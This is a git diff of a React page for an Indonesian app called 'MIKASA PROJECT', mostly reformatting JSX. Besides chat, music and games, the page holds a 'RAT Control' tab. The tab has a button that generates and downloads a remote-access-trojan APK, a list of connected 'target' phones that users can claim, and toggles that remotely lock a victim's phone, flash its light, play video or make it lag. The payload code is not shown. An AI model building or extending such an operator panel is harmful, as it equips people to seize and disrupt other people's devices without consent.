-            {isScanning ? "Menyiapkan antarmuka..." : "Untuk membuka akses"}
-          </p>
+          <h2 className={`text-white text-xl font-bold mt-8 transition-colors duration-300 ${isScanning ? 'text-green-400' : 'text-white'}`}>{isScanning ? "Autentikasi Berhasil" : "Sentuh Sidik Jari"}</h2>
+          <p className="text-zinc-500 text-sm mt-2">{isScanning ? "Menyiapkan antarmuka..." : "Untuk membuka akses"}</p>
         </div>
       )}
 
       <header className="p-4 flex items-center justify-between sticky top-0 bg-[#0f0a15]/90 backdrop-blur-md z-30 border-b border-zinc-800">
-        <button onClick={() => setIsSidebarOpen(true)} className="text-white p-2">
-          <Menu size={24} />
-        </button>
-        <h1 className="text-white font-semibold text-lg capitalize flex-1 ml-2">
-          {activeTab === "home" ? `Hello, ${userProfile.name}` : activeTab}
-        </h1>
+        <button onClick={() => setIsSidebarOpen(true)} className="text-white p-2"><Menu size={24} /></button>
+        <h1 className="text-white font-semibold text-lg capitalize flex-1 ml-2">{activeTab === "home" ? `Hello, ${userProfile.name}` : activeTab}</h1>
         <button onClick={() => setShowProfileModal(true)} className="w-10 h-10 rounded-full border border-zinc-500 overflow-hidden bg-zinc-800 flex items-center justify-center">
            {userProfile.avatar ? <img src={userProfile.avatar} className="w-full h-full object-cover"/> : <User size={20} className="text-zinc-400"/>}
         </button>
@@ -923,31 +976,18 @@ export default function Home() {
       {renderSenderModal()}
       {renderPinModal()}
 
-      {activeGame === 'catur' && <GameCatur level="medium" onClose={() => setActiveGame(null)} />}
-      {activeGame === 'uno' && <GameUno onClose={() => setActiveGame(null)} />}
-      {activeGame === 'ular' && <GameUlarTangga onClose={() => setActiveGame(null)} />}
-      {activeGame === 'spy' && <GameSpy onClose={() => setActiveGame(null)} />}
-      {activeGame === 'tictactoe' && <GameTicTacToe level="medium" onClose={() => setActiveGame(null)} />}
-
       <main className="px-4 max-w-md mx-auto mt-2 space-y-6">
-
         {activeTab === "home" && (
           <>
             <div className="bg-gradient-to-br from-zinc-800 to-zinc-900 border border-zinc-700 rounded-3xl p-6 relative overflow-hidden shadow-2xl">
               <div className="absolute top-0 right-0 w-32 h-32 bg-zinc-600/20 blur-3xl rounded-full"></div>
-              <div className="inline-block bg-zinc-700/50 border border-zinc-600 text-zinc-300 text-[10px] font-bold px-3 py-1 rounded-full mb-4 tracking-widest">
-                MIKASA PROJECT
-              </div>
+              <div className="inline-block bg-zinc-700/50 border border-zinc-600 text-zinc-300 text-[10px] font-bold px-3 py-1 rounded-full mb-4 tracking-widest">MIKASA PROJECT</div>
               <div className="flex justify-between items-start">
                 <div>
                   <h2 className="text-white text-2xl font-bold leading-tight mb-2">Selamat Datang,<br/>{userProfile.name}</h2>
                   <div className="flex gap-2">
-                    <div className="flex items-center gap-1 bg-zinc-800/80 border border-zinc-700 px-3 py-1.5 rounded-lg text-xs text-zinc-300">
-                      <Clock size={12} /> {userProfile.expired}
-                    </div>
-                    <div className="flex items-center gap-1 bg-zinc-800/80 border border-zinc-700 px-3 py-1.5 rounded-lg text-xs text-zinc-300">
-                      <User size={12} /> {userRole}
-                    </div>
+                    <div className="flex items-center gap-1 bg-zinc-800/80 border border-zinc-700 px-3 py-1.5 rounded-lg text-xs text-zinc-300"><Clock size={12} /> {userProfile.expired}</div>
+                    <div className="flex items-center gap-1 bg-zinc-800/80 border border-zinc-700 px-3 py-1.5 rounded-lg text-xs text-zinc-300"><User size={12} /> {userRole}</div>
                   </div>
                 </div>
                 <div className="flex flex-col items-center justify-center w-24 h-24 rounded-full border-2 border-zinc-600 bg-zinc-800/50 shadow-inner">
@@ -964,9 +1004,7 @@ export default function Home() {
               </div>
               <div className="flex gap-4 overflow-x-auto pb-2 scrollbar-hide">
                 <div className="flex flex-col items-center gap-1 min-w-[60px] cursor-pointer">
-                  <div className="w-14 h-14 rounded-full border-2 border-dashed border-zinc-600 flex items-center justify-center bg-[#1c1c1e] relative">
-                    <Plus size={20} className="text-zinc-400" />
-                  </div>
+                  <div className="w-14 h-14 rounded-full border-2 border-dashed border-zinc-600 flex items-center justify-center bg-[#1c1c1e] relative"><Plus size={20} className="text-zinc-400" /></div>
                   <span className="text-[10px] text-zinc-400">Tambah</span>
                 </div>
                 {onlineUsers.map((name, i) => (
@@ -974,11 +1012,7 @@ export default function Home() {
                     <div className="w-14 h-14 rounded-full border-2 border-green-500 p-0.5">
                       <UserAvatar name={name} avatarMap={serverAvatars} size={13} border="border-zinc-800" />
                     </div>
-                    {unreadPrivMap[name] > 0 && (
-                      <span className="absolute top-0 right-2 bg-red-500 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-[#0f0a15]">
-                        {unreadPrivMap[name] > 9 ? '9+' : unreadPrivMap[name]}
-                      </span>
-                    )}
+                    {unreadPrivMap[name] > 0 && (<span className="absolute top-0 right-2 bg-red-500 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-[#0f0a15]">{unreadPrivMap[name] > 9 ? '9+' : unreadPrivMap[name]}</span>)}
                     <span className="text-[10px] text-zinc-300 truncate w-14 text-center">{name}</span>
                   </div>
                 ))}
@@ -989,50 +1023,28 @@ export default function Home() {
               <button onClick={openGlobalChat} className="bg-blue-600 hover:bg-blue-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-blue-900/20 relative">
                 <MessageSquare size={20} className="text-white" />
                 <span className="text-white text-xs font-bold">Public Chat</span>
-                {unreadGlobal > 0 && (
-                  <span className="absolute -top-1 -right-1 bg-red-500 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-[#0f0a15]">
-                    {unreadGlobal > 9 ? '9+' : unreadGlobal}
-                  </span>
-                )}
+                {unreadGlobal > 0 && (<span className="absolute -top-1 -right-1 bg-red-500 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-[#0f0a15]">{unreadGlobal > 9 ? '9+' : unreadGlobal}</span>)}
               </button>
-              <a href="https://wa.me/6283832110509" target="_blank" rel="noopener noreferrer" className="bg-emerald-600 hover:bg-emerald-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-emerald-900/20">
-                <Phone size={20} className="text-white" />
-                <span className="text-white text-xs font-bold">Developer</span>
-              </a>
-              <button onClick={() => setActiveTab("games")} className="bg-yellow-600 hover:bg-yellow-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-yellow-900/20">
-                <Gamepad2 size={20} className="text-white" />
-                <span className="text-white text-xs font-bold">Games</span>
-              </button>
+              <a href="https://wa.me/6283832110509" target="_blank" rel="noopener noreferrer" className="bg-emerald-600 hover:bg-emerald-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-emerald-900/20"><Phone size={20} className="text-white" /><span className="text-white text-xs font-bold">Developer</span></a>
+              <button onClick={() => setActiveTab("games")} className="bg-yellow-600 hover:bg-yellow-500 transition-colors rounded-xl p-3 flex flex-col items-center justify-center gap-1 shadow-lg shadow-yellow-900/20"><Gamepad2 size={20} className="text-white" /><span className="text-white text-xs font-bold">Games</span></button>
             </div>
 
             <div>
               <h3 className="text-xs font-bold text-zinc-400 tracking-wider mb-2">NOW PLAYING</h3>
               <div onClick={() => setShowMusicLibrary(true)} className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex items-center justify-between cursor-pointer hover:border-zinc-500 transition-all">
                 <div className="flex items-center gap-3">
-                  <div className={`w-10 h-10 rounded-lg flex items-center justify-center overflow-hidden ${isPlaying ? 'bg-zinc-700' : 'bg-zinc-800'}`}>
-                    {currentSong?.artworkUrl100 ? <img src={currentSong.artworkUrl100} className="w-full h-full object-cover" alt="art"/> : <Music size={20} className="text-zinc-500" />}
-                  </div>
+                  <div className={`w-10 h-10 rounded-lg flex items-center justify-center overflow-hidden ${isPlaying ? 'bg-zinc-700' : 'bg-zinc-800'}`}>{currentSong?.artworkUrl100 ? <img src={currentSong.artworkUrl100} className="w-full h-full object-cover" alt="art"/> : <Music size={20} className="text-zinc-500" />}</div>
                   <div>
                     <p className="text-sm text-zinc-300 font-semibold truncate max-w-[150px]">{currentSong ? currentSong.trackName : "Belum ada lagu"}</p>
                     <p className="text-[10px] text-zinc-500">{currentSong ? currentSong.artistName : "Buka Music library"}</p>
                   </div>
                 </div>
-                <div className="flex items-center gap-3">
-                  {currentSong && <button onClick={(e) => { e.stopPropagation(); togglePlay(); }} className="p-2 bg-zinc-800 text-zinc-300 rounded-full">{isPlaying ? <Pause size={16}/> : <Play size={16}/>}</button>}
-                </div>
+                <div className="flex items-center gap-3">{currentSong && <button onClick={(e) => { e.stopPropagation(); togglePlay(); }} className="p-2 bg-zinc-800 text-zinc-300 rounded-full">{isPlaying ? <Pause size={16}/> : <Play size={16}/>}</button>}</div>
               </div>
             </div>
 
             <div className="w-full h-48 bg-black rounded-2xl overflow-hidden relative shadow-lg border border-zinc-800">
-              <video
-                key={videoIndex}
-                autoPlay
-                muted
-                playsInline
-                className="w-full h-full object-cover"
-                onEnded={() => setVideoIndex(1)}
-                loop={videoIndex === 1}
-              >
+              <video key={videoIndex} autoPlay muted playsInline className="w-full h-full object-cover" onEnded={() => setVideoIndex(1)} loop={videoIndex === 1}>
                 <source src={videoIndex === 0 ? VIDEO_1 : VIDEO_2} type="video/mp4" />
               </video>
             </div>
@@ -1040,27 +1052,14 @@ export default function Home() {
             <div>
               <h3 className="text-sm font-bold text-white mb-3 flex items-center gap-2"><ShieldAlert size={16} className="text-zinc-400"/> Statistik Akun</h3>
               <div className="grid grid-cols-3 gap-2">
-                <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex flex-col items-center justify-center">
-                  <CheckCircle2 size={20} className="text-zinc-400 mb-2" />
-                  <span className="text-[9px] text-zinc-500 mb-1">EXPIRED</span>
-                  <span className="text-xs text-white font-bold">{userProfile.expired}</span>
-                </div>
-                <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex flex-col items-center justify-center">
-                  <User size={20} className="text-zinc-400 mb-2" />
-                  <span className="text-[9px] text-zinc-500 mb-1">ROLE</span>
-                  <span className="text-xs text-white font-bold uppercase">{userRole}</span>
-                </div>
-                <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex flex-col items-center justify-center">
-                  <Clock size={20} className="text-zinc-400 mb-2" />
-                  <span className="text-[9px] text-zinc-500 mb-1">RUNTIME</span>
-                  <span className="text-xs text-white font-bold">{runtime}</span>
-                </div>
+                <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex flex-col items-center justify-center"><CheckCircle2 size={20} className="text-zinc-400 mb-2" /><span className="text-[9px] text-zinc-500 mb-1">EXPIRED</span><span className="text-xs text-white font-bold">{userProfile.expired}</span></div>
+                <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex flex-col items-center justify-center"><User size={20} className="text-zinc-400 mb-2" /><span className="text-[9px] text-zinc-500 mb-1">ROLE</span><span className="text-xs text-white font-bold uppercase">{userRole}</span></div>
+                <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 flex flex-col items-center justify-center"><Clock size={20} className="text-zinc-400 mb-2" /><span className="text-[9px] text-zinc-500 mb-1">RUNTIME</span><span className="text-xs text-white font-bold">{runtime}</span></div>
               </div>
             </div>
 
             <div>
               <h3 className="text-sm font-bold text-white mb-3 flex items-center gap-2"><Wrench size={16} className="text-zinc-400"/> Semua Fitur</h3>
-
               <div className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-3 mb-3 flex items-center justify-between">
                 <div className="flex items-center gap-2">
                   <Shield size={18} className={senderActive ? "text-green-500" : "text-red-500"} />
@@ -1071,25 +1070,14 @@ export default function Home() {
                 </div>
                 <button onClick={() => setShowSenderModal(true)} className="bg-zinc-800 px-3 py-1 rounded-lg text-xs text-white">{senderActive ? "Ganti" : "Hubungkan"}</button>
               </div>
-
               <div className="flex gap-2 overflow-x-auto pb-3 scrollbar-hide mb-2">
-                {CATEGORIES.map((cat) => (
-                  <button key={cat} onClick={() => setToolCategory(cat)} className={`px-3 py-1 text-xs rounded-full whitespace-nowrap ${toolCategory === cat ? 'bg-zinc-600 text-white' : 'bg-[#1c1c1e] text-zinc-400 border border-zinc-700'}`}>
-                    {cat}
-                  </button>
-                ))}
+                {CATEGORIES.map((cat) => (<button key={cat} onClick={() => setToolCategory(cat)} className={`px-3 py-1 text-xs rounded-full whitespace-nowrap ${toolCategory === cat ? 'bg-zinc-600 text-white' : 'bg-[#1c1c1e] text-zinc-400 border border-zinc-700'}`}>{cat}</button>))}
               </div>
-
               <div className="grid grid-cols-2 gap-3">
                 {ALL_TOOLS.filter(t => toolCategory === "Semua" || t.cat === toolCategory).map((tool) => (
                   <button key={tool.id} onClick={() => setActiveTool(tool)} className="bg-[#1c1c1e] border border-zinc-700 rounded-2xl p-3 flex items-center gap-3 hover:bg-zinc-800 transition-colors text-left">
-                    <div className={`w-10 h-10 rounded-full flex items-center justify-center border bg-black/30 ${tool.color} border-zinc-600`}>
-                      <tool.icon size={20} />
-                    </div>
-                    <div className="flex flex-col">
-                      <span className="text-xs text-white font-bold">{tool.name}</span>
-                      <span className="text-[9px] text-zinc-500">{tool.sub}</span>
-                    </div>
+                    <div className={`w-10 h-10 rounded-full flex items-center justify-center border bg-black/30 ${tool.color} border-zinc-600`}><tool.icon size={20} /></div>
+                    <div className="flex flex-col"><span className="text-xs text-white font-bold">{tool.name}</span><span className="text-[9px] text-zinc-500">{tool.sub}</span></div>
                   </button>
                 ))}
               </div>
@@ -1100,44 +1088,26 @@ export default function Home() {
         {activeTab === "chat" && (
           <div className="fixed inset-0 bg-[#0f0a15] z-40 flex flex-col h-[100dvh]">
             <div className="bg-[#0f0a15]/90 backdrop-blur-md flex items-center px-4 border-b border-zinc-800 pt-4 pb-2 shrink-0">
-              <button onClick={() => setActiveTab("home")} className="p-2 mr-2 text-white">
-                <ChevronLeft size={24} />
-              </button>
+              <button onClick={() => setActiveTab("home")} className="p-2 mr-2 text-white"><ChevronLeft size={24} /></button>
               <div className="flex flex-col flex-1">
                 <span className="text-white font-bold">{chatMode === "global" ? "Public Chat" : chatTarget}</span>
                 <span className="text-[10px] text-zinc-400">{chatMode === "global" ? "Semua User" : "Private Message"}</span>
               </div>
             </div>
-
             <div ref={chatScrollRef} className="flex-1 overflow-y-auto px-4 py-4 space-y-3 bg-[#0a0610]">
               {(chatMode === "global" ? globalMsgs : privateMsgs).map((m, i) => {
                 const isMe = m.from === username;
                 const showDate = i === 0 || dateFmt(m.ts) !== dateFmt((chatMode === "global" ? globalMsgs : privateMsgs)[i - 1].ts);
-
                 return (
                   <div key={i}>
-                    {showDate && (
-                      <div className="flex justify-center my-3">
-                        <span className="text-[10px] text-zinc-500 bg-[#1c1c1e] px-3 py-1 rounded-full border border-zinc-700">
-                          {dateFmt(m.ts)}
-                        </span>
-                      </div>
-                    )}
+                    {showDate && (<div className="flex justify-center my-3"><span className="text-[10px] text-zinc-500 bg-[#1c1c1e] px-3 py-1 rounded-full border border-zinc-700">{dateFmt(m.ts)}</span></div>)}
                     <div className={`flex ${isMe ? 'justify-end' : 'justify-start'} gap-2 mb-1`}>
-                      {!isMe && (
-                        <div className="self-end mb-1">
-                          <UserAvatar name={m.from} avatarMap={serverAvatars} size={8} border="border-zinc-700" />
-                        </div>
-                      )}
+                      {!isMe && (<div className="self-end mb-1"><UserAvatar name={m.from} avatarMap={serverAvatars} size={8} border="border-zinc-700" /></div>)}
                       <div className={`flex flex-col max-w-[78%] ${isMe ? 'items-end' : 'items-start'}`}>
-                        {!isMe && chatMode === "global" && (
-                          <span className="text-[10px] text-zinc-500 mb-1 ml-1">{m.from}</span>
-                        )}
+                        {!isMe && chatMode === "global" && (<span className="text-[10px] text-zinc-500 mb-1 ml-1">{m.from}</span>)}
                         <div className={`px-3 py-2 rounded-2xl text-sm break-words ${isMe ? 'bg-emerald-700/80 text-white rounded-tr-sm' : 'bg-[#1c1c1e] text-zinc-100 rounded-tl-sm border border-zinc-700'}`}>
                           {m.msg}
-                          <div className={`text-[9px] mt-1 ${isMe ? 'text-emerald-200/70 text-right' : 'text-zinc-500'}`}>
-                            {timeFmt(m.ts)}
-                          </div>
+                          <div className={`text-[9px] mt-1 ${isMe ? 'text-emerald-200/70 text-right' : 'text-zinc-500'}`}>{timeFmt(m.ts)}</div>
                         </div>
                       </div>
                     </div>
@@ -1152,7 +1122,6 @@ export default function Home() {
                 </div>
               )}
             </div>
-
             <form onSubmit={chatMode === "global" ? sendGlobalMsg : sendPrivateMsg} className="p-3 bg-[#1c1c1e] border-t border-zinc-700 flex gap-2 items-center shrink-0">
               <input type="text" value={msgInput} onChange={e=>setMsgInput(e.target.value)} placeholder="Ketik pesan..." className="flex-1 bg-[#0f0a15] border border-zinc-700 rounded-full px-4 py-2 text-sm text-white focus:outline-none focus:border-zinc-500" />
               <button type="submit" className="bg-emerald-600 hover:bg-emerald-500 p-2 rounded-full text-white transition-colors"><Send size={16} /></button>
@@ -1164,17 +1133,11 @@ export default function Home() {
           <div>
             <button onClick={() => setActiveTab("home")} className="text-zinc-400 text-sm mb-4 flex items-center gap-1"><ChevronLeft size={16}/> Kembali ke Home</button>
             <div className="grid grid-cols-2 gap-3">
-              {[
-                { id: "catur", title: "Catur", icon: <Crown size={24} className="text-zinc-300" /> },
-                { id: "uno", title: "Uno", icon: <CircleDollarSign size={24} className="text-red-400" /> },
-                { id: "tictactoe", title: "Tic Tac Toe", icon: <Grid3X3 size={24} className="text-green-400" /> },
-                { id: "ular", title: "Ular Tangga", icon: <Dices size={24} className="text-orange-400" /> },
-                { id: "spy", title: "Who's The Spy", icon: <Users size={24} className="text-purple-400" /> },
-              ].map((game) => (
+              {GAMES.map((game) => (
                 <div key={game.id} onClick={() => setActiveGame(game.id)} className="bg-[#1c1c1e] border border-zinc-700 rounded-xl p-4 flex flex-col items-center text-center cursor-pointer hover:border-zinc-500">
                   <div className="w-12 h-12 bg-[#0f0a15] rounded-full flex items-center justify-center mb-2">{game.icon}</div>
                   <h3 className="text-white font-bold text-sm">{game.title}</h3>
-                  <span className="text-[10px] text-zinc-400 mt-2">Main vs NPC</span>
+                  <span className="text-[10px] text-zinc-400 mt-2">{game.desc}</span>
                 </div>
               ))}
             </div>
@@ -1184,109 +1147,49 @@ export default function Home() {
         {activeTab === "rat" && (
           <div className="space-y-4">
             <h2 className="text-white font-bold text-xl mb-4">RAT Control</h2>
-
-            <div className="w-full h-48 bg-black rounded-2xl overflow-hidden relative shadow-lg border border-zinc-800 mb-4">
-              <video autoPlay muted loop playsInline className="w-full h-full object-cover">
-                <source src={RAT_VIDEO} type="video/mp4" />
-              </video>
-            </div>
-
-            <button
-              onClick={handleGenerateAPK}
-              disabled={isGenerating}
-              className="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-xl flex justify-center items-center gap-2 mb-4 transition-colors"
-            >
+            <div className="w-full h-48 bg-black rounded-2xl overflow-hidden relative shadow-lg border border-zinc-800 mb-4"><video autoPlay muted loop playsInline className="w-full h-full object-cover"><source src={RAT_VIDEO} type="video/mp4" /></video></div>
+            <button onClick={handleGenerateAPK} disabled={isGenerating} className="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-xl flex justify-center items-center gap-2 mb-4 transition-colors">
               {isGenerating ? <Loader2 className="animate-spin" size={20}/> : <DownloadCloud size={20}/>}
               {isGenerating ? "Merakit APK..." : "Generate & Download APK RAT"}
             </button>
-
             <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl mb-4">
-              <h3 className="text-white font-bold text-sm mb-3 flex items-center gap-2">
-                <Smartphone size={16} className="text-green-500" />
-                Target Terhubung ({onlineDevices.length})
-              </h3>
+              <h3 className="text-white font-bold text-sm mb-3 flex items-center gap-2"><Smartphone size={16} className="text-green-500" /> Target Terhubung ({onlineDevices.length})</h3>
               {onlineDevices.length === 0 ? (
                 <p className="text-xs text-zinc-500 text-center py-2">Belum ada HP target yang terhubung.</p>
               ) : (
                 <div className="space-y-2 max-h-40 overflow-y-auto">
                   {onlineDevices.map((device) => (
-                    <div
-                      key={device.deviceId}
-                      className={`p-3 rounded-lg border flex justify-between items-center ${
-                        device.ownerId === username
-                          ? (ratTargetId === device.deviceId ? 'bg-green-900/30 border-green-500' : 'bg-black/40 border-green-500/50 hover:border-green-500')
-                          : 'bg-yellow-900/20 border-yellow-500/50'
-                      }`}
-                    >
+                    <div key={device.deviceId} className={`p-3 rounded-lg border flex justify-between items-center ${device.ownerId === username ? (ratTargetId === device.deviceId ? 'bg-green-900/30 border-green-500' : 'bg-black/40 border-green-500/50 hover:border-green-500') : 'bg-yellow-900/20 border-yellow-500/50'}`}>
                       <div>
-                        <p className="text-xs text-white font-bold">
-                          {device.deviceName}
-                          {device.ownerId === username && " (Milik Anda)"}
-                          {!device.ownerId && " (Baru Terhubung)"}
-                        </p>
+                        <p className="text-xs text-white font-bold">{device.deviceName}{device.ownerId === username && " (Milik Anda)"}{!device.ownerId && " (Baru Terhubung)"}</p>
                         <p className="text-[10px] text-zinc-500 font-mono">{device.deviceId}</p>
                       </div>
-
                       {device.ownerId === username ? (
-                        <button
-                          onClick={() => setRatTargetId(device.deviceId)}
-                          className={`px-3 py-1 rounded text-xs font-bold ${ratTargetId === device.deviceId ? 'bg-green-600 text-white' : 'bg-zinc-700 text-white'}`}
-                        >
-                          {ratTargetId === device.deviceId ? 'Dipilih' : 'Pilih'}
-                        </button>
+                        <button onClick={() => setRatTargetId(device.deviceId)} className={`px-3 py-1 rounded text-xs font-bold ${ratTargetId === device.deviceId ? 'bg-green-600 text-white' : 'bg-zinc-700 text-white'}`}>{ratTargetId === device.deviceId ? 'Dipilih' : 'Pilih'}</button>
                       ) : (
-                        <button
-                          onClick={() => claimDevice(device.deviceId)}
-                          className="px-3 py-1 rounded text-xs font-bold bg-yellow-600 hover:bg-yellow-500 text-white"
-                        >
-                          Klaim
-                        </button>
+                        <button onClick={() => claimDevice(device.deviceId)} className="px-3 py-1 rounded text-xs font-bold bg-yellow-600 hover:bg-yellow-500 text-white">Klaim</button>
                       )}
                     </div>
                   ))}
                 </div>
               )}
             </div>
-
             <div className="space-y-3">
               <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl flex items-center justify-between">
-                <div className="flex items-center gap-3">
-                  <Lightbulb className={ratStates.flashlight ? "text-yellow-400" : "text-zinc-500"} />
-                  <span className="text-white font-bold text-sm">Senter HP</span>
-                </div>
-                <button onClick={() => toggleRat('flashlight')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.flashlight ? 'bg-green-500' : 'bg-zinc-700'}`}>
-                   <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.flashlight ? 'left-7' : 'left-1'}`}></div>
-                </button>
+                <div className="flex items-center gap-3"><Lightbulb className={ratStates.flashlight ? "text-yellow-400" : "text-zinc-500"} /><span className="text-white font-bold text-sm">Senter HP</span></div>
+                <button onClick={() => toggleRat('flashlight')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.flashlight ? 'bg-green-500' : 'bg-zinc-700'}`}><div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.flashlight ? 'left-7' : 'left-1'}`}></div></button>
               </div>
-
               <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl flex items-center justify-between">
-                <div className="flex items-center gap-3">
-                  <Lock size={20} className={ratStates.lock ? "text-red-500" : "text-zinc-500"} />
-                  <span className="text-white font-bold text-sm">Lock HP</span>
-                </div>
-                <button onClick={() => toggleRat('lock')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.lock ? 'bg-red-500' : 'bg-zinc-700'}`}>
-                   <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.lock ? 'left-7' : 'left-1'}`}></div>
-                </button>
+                <div className="flex items-center gap-3"><Lock size={20} className={ratStates.lock ? "text-red-500" : "text-zinc-500"} /><span className="text-white font-bold text-sm">Lock HP</span></div>
+                <button onClick={() => toggleRat('lock')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.lock ? 'bg-red-500' : 'bg-zinc-700'}`}><div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.lock ? 'left-7' : 'left-1'}`}></div></button>
               </div>
-
               <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl flex items-center justify-between">
-                <div className="flex items-center gap-3">
-                  <Video size={20} className={ratStates.video ? "text-purple-500" : "text-zinc-500"} />
-                  <span className="text-white font-bold text-sm">Putar Video</span>
-                </div>
-                <button onClick={() => toggleRat('video')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.video ? 'bg-purple-500' : 'bg-zinc-700'}`}>
-                   <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.video ? 'left-7' : 'left-1'}`}></div>
-                </button>
+                <div className="flex items-center gap-3"><Video size={20} className={ratStates.video ? "text-purple-500" : "text-zinc-500"} /><span className="text-white font-bold text-sm">Putar Video</span></div>
+                <button onClick={() => toggleRat('video')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.video ? 'bg-purple-500' : 'bg-zinc-700'}`}><div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.video ? 'left-7' : 'left-1'}`}></div></button>
               </div>
-
               <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl flex items-center justify-between">
-                <div className="flex items-center gap-3">
-                  <AlertTriangle size={20} className={ratStates.lag ? "text-red-500" : "text-zinc-500"} />
-                  <span className="text-white font-bold text-sm">Bikin Lag Parah</span>
-                </div>
-                <button onClick={() => toggleRat('lag')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.lag ? 'bg-red-500' : 'bg-zinc-700'}`}>
-                   <div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.lag ? 'left-7' : 'left-1'}`}></div>
-                </button>
+                <div className="flex items-center gap-3"><AlertTriangle size={20} className={ratStates.lag ? "text-red-500" : "text-zinc-500"} /><span className="text-white font-bold text-sm">Bikin Lag Parah</span></div>
+                <button onClick={() => toggleRat('lag')} disabled={ratLoading} className={`w-12 h-6 rounded-full transition-colors relative ${ratStates.lag ? 'bg-red-500' : 'bg-zinc-700'}`}><div className={`absolute top-1 w-4 h-4 rounded-full bg-white transition-all ${ratStates.lag ? 'left-7' : 'left-1'}`}></div></button>
               </div>
             </div>
           </div>
@@ -1295,15 +1198,8 @@ export default function Home() {
         {activeTab === "settings" && (
           <div className="space-y-4">
              <h2 className="text-white font-bold text-xl mb-4">Settings</h2>
-             <button onClick={() => setShowProfileModal(true)} className="w-full bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl flex items-center gap-4 hover:bg-zinc-800">
-                <User size={20} className="text-zinc-400" />
-                <span className="text-white">Edit Profil</span>
-             </button>
-             <button onClick={handleLogout} className="w-full bg-red-900/20 border border-red-900/50 p-4 rounded-xl flex items-center gap-4 text-red-400 hover:bg-red-900/40">
-                <LogOut size={20} />
-                <span>Logout Akun</span>
-             </button>
-
+             <button onClick={() => setShowProfileModal(true)} className="w-full bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl flex items-center gap-4 hover:bg-zinc-800"><User size={20} className="text-zinc-400" /><span className="text-white">Edit Profil</span></button>
+             <button onClick={handleLogout} className="w-full bg-red-900/20 border border-red-900/50 p-4 rounded-xl flex items-center gap-4 text-red-400 hover:bg-red-900/40"><LogOut size={20} /><span>Logout Akun</span></button>
              <div className="bg-[#1c1c1e] border border-zinc-700 p-4 rounded-xl mt-6">
                 <h3 className="text-white font-bold mb-2">Info Aplikasi</h3>
                 <p className="text-xs text-zinc-400">Versi: 2.0.0 (Mikasa Update)</p>
@@ -1324,11 +1220,7 @@ export default function Home() {
              <button key={item.id} onClick={() => { if(item.id === 'chat') openGlobalChat(); else setActiveTab(item.id); }} className={`flex flex-col items-center p-2 relative ${activeTab === item.id ? 'text-zinc-300' : 'text-zinc-600'}`}>
                <div className={`p-2 rounded-full ${activeTab === item.id ? 'bg-zinc-700 text-white' : ''}`}>{item.icon}</div>
                <span className="text-[10px]">{item.label}</span>
-               {item.id === 'chat' && unreadTotal > 0 && (
-                 <span className="absolute top-0 right-2 bg-red-500 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-[#1c1c1e]">
-                   {unreadTotal > 9 ? '9+' : unreadTotal}
-                 </span>
-               )}
+               {item.id === 'chat' && unreadTotal > 0 && (<span className="absolute top-0 right-2 bg-red-500 text-white text-[10px] font-bold w-5 h-5 flex items-center justify-center rounded-full border-2 border-[#1c1c1e]">{unreadTotal > 9 ? '9+' : unreadTotal}</span>)}
              </button>
            ))}
         </div>
